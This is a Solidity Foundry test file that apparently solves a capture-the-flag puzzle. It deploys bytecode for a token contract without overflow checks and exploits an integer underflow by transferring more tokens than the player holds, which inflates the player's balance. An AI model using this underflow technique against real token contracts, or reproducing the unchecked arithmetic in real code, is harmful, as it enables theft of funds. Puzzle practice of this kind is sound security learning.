// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

//import {Token} from "src/Challenge4-token/Puzzle.sol";
interface Token {
  function totalSupply() external view returns(uint256);

  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address _owner) external view returns (uint balance);
}

contract Challenge5Test is Test {
    Token public puzzle;
    address player = makeAddr("player");

    /// @dev Setup the testing environment.
    function setUp() public {
        bytes memory bytecode = hex"608060405234801561001057600080fd5b506014600181905533600090815260208190526040902055610186806100376000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806318160ddd1461004657806370a0823114610060578063a9059cbb14610093575b600080fd5b61004e6100e0565b60408051918252519081900360200190f35b61004e6004803603602081101561007657600080fd5b503573ffffffffffffffffffffffffffffffffffffffff166100e6565b6100cc600480360360408110156100a957600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813516906020013561010e565b604080519115158252519081900360200190f35b60015481565b73ffffffffffffffffffffffffffffffffffffffff1660009081526020819052604090205490565b336000908152602081905260408082208054849003905573ffffffffffffffffffffffffffffffffffffffff939093168152919091208054909101905560019056fea26469706673582212204a29306519fa63c46b4e1314e25b5346d11c1d189baa123c855e74278b390ef364736f6c634300060c0033";
        vm.startPrank(player);
        ///@notice deploy the bytecode with the create instruction
        address deployedAddress;
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        vm.stopPrank();
        puzzle = Token(deployedAddress);
    }

    function testSimpleHack() public {
        assertEq(puzzle.balanceOf(player), 20);

        vm.startPrank(player,player);
        //new Hack(address(puzzle));
        puzzle.transfer(address(this),type(uint256).max);
        vm.stopPrank();
        puzzle.transfer(player,9999999999);

        assertGt(puzzle.balanceOf(player), 10000);
    }


    function testHackHuff() public {
       // solution in huff doesnt got sense lets move to more interesting problems
    }
    
}
